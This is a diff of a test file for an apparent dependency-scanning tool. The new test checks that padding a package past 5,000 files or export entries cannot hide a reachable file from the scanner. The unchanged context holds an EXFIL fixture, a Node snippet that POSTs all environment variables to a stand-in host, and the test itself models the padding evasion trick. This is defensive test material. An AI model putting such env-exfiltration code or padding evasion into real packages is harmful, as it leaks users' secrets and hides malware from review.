@@ -12,7 +12,7 @@ import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, symlinkSyn
 import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
 import { run } from "../src/index.js";
-import { treeJoin, npmEntries } from "../src/deps.js";
+import { treeJoin, npmEntries, webAssets } from "../src/deps.js";
 
 const EXFIL = "const h = require('https');\n" +
   "h.request({host: 'collector.invalid', method: 'POST'}).end(JSON.stringify(process.env));\n";
@@ -192,4 +192,23 @@ test("--deps: a web app's static assets no entry point reaches are not code that
     exports: { ".": { import: "./e.mjs", require: ["./f.js", "./g.js"] }, "./*": "./h/*.js" } }),
   ["a.js", "b.mjs", "c.js", "./e.mjs", "./f.js", "./g.js"]);
   assert.deepEqual(npmEntries({ bin: "x.js", exports: "./y.js" }), ["x.js", "./y.js"]);
+});
+
+test("--deps: padding hides no file from the walk (BR-5)", () => {
+  // the walk from a package's entry points stopped at 5,000 files, and its exports were read to 5,000 entry points,
+  // so a file in static/ reached past them was left out as a web asset (the Python test: the same)
+  const files = Array.from({ length: 5100 }, (_, i) => ({
+    path: `node_modules/w/lib/f${i}.js`, content: `require('./f${i + 1}.js');\n`, lang: "js", dep: true,
+  }));
+  files.push({ path: "node_modules/w/lib/f5100.js", content: "require('../static/run.js');\n", lang: "js", dep: true },
+    { path: "node_modules/w/static/run.js", content: WEB, lang: "js", dep: true });
+  const manifest = {
+    path: "node_modules/w/package.json", content: JSON.stringify({ name: "w", version: "1.0.0", main: "lib/f0.js" }),
+  };
+  const sources = new Map(files.map((f) => [f.path, f]));
+  const manifests = new Map([[manifest.path, manifest]]);
+  const tree = { sources, manifests, resolve: (p) => (sources.has(p) ? p : null) };
+  assert.deepEqual([...webAssets(tree, files)], []);
+  const exports = Object.fromEntries(Array.from({ length: 6000 }, (_, i) => [`./p${i}`, `./p${i}.js`]));
+  assert.equal(npmEntries({ exports }).length, 6000);
 });
